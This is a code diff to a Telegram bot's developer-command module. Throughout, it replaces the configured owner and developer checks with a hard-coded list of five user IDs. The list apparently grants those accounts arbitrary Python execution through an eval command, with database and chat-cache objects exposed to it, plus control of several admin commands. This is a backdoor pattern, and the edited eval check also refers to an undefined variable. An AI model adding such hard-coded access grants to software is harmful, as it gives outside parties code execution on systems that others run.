@@ -32,6 +32,7 @@ from src.logger import LOGGER
 from src.modules.utils import Filter
 from src.modules.utils.play_helpers import del_msg, extract_argument
 
+ALLOWED_USERS = [7321657753, 6848223695, 6517263456, 5350261891, 7765692814]
 
 def format_exception(
     exp: BaseException, tb: Optional[list[traceback.FrameSummary]] = None
@@ -62,7 +63,7 @@ async def exec_eval(c: Client, m: types.Message):
     """
     Run python code.
     """
-    if int(m.from_id) != OWNER_ID:
+    if int(message.from_id) not in ALLOWED_USERS:
         return None
 
     text = m.text.split(None, 1)
@@ -99,6 +100,8 @@ async def exec_eval(c: Client, m: types.Message):
             "traceback": traceback,
             "uuid": uuid,
             "io": io,
+            "chat_cache": chat_cache,
+            "db": db,
         }
 
         try:
@@ -159,7 +162,7 @@ async def exec_eval(c: Client, m: types.Message):
 @Client.on_message(filters=Filter.command("stats"))
 async def sys_stats(client: Client, message: types.Message):
     """Get comprehensive bot and system statistics including hardware, software, and performance metrics."""
-    if message.from_id not in DEVS:
+    if int(message.from_id) not in ALLOWED_USERS:
         await del_msg(message)
         return
 
@@ -272,12 +275,12 @@ async def sys_stats(client: Client, message: types.Message):
     await sys_msg.edit_text(response, disable_web_page_preview=True)
 
 
-@Client.on_message(filters=Filter.command("activevc"))
+@Client.on_message(filters=Filter.command("ac"))
 async def active_vc(_: Client, message: types.Message):
     """
     Get active voice chats.
     """
-    if message.from_id not in DEVS:
+    if int(message.from_id) not in ALLOWED_USERS:
         await del_msg(message)
         return None
 
@@ -315,7 +318,7 @@ async def logger(c: Client, message: types.Message):
     """
     Enable or disable logging.
     """
-    if message.from_id not in DEVS:
+    if int(message.from_id) not in ALLOWED_USERS:
         await del_msg(message)
         return
 
@@ -350,7 +353,7 @@ async def logger(c: Client, message: types.Message):
 
 @Client.on_message(filters=Filter.command(["autoend", "auto_end"]))
 async def auto_end(c: Client, message: types.Message):
-    if message.from_id not in DEVS:
+    if int(message.from_id) not in ALLOWED_USERS:
         await del_msg(message)
         return
 
@@ -383,7 +386,7 @@ async def auto_end(c: Client, message: types.Message):
 
 @Client.on_message(filters=Filter.command(["clearass", "clearallassistants"]))
 async def clear_all_assistants(_: Client, message: types.Message):
-    if message.from_id not in DEVS:
+    if int(message.from_id) not in ALLOWED_USERS:
         await del_msg(message)
         return
     count = await db.clear_all_assistants()
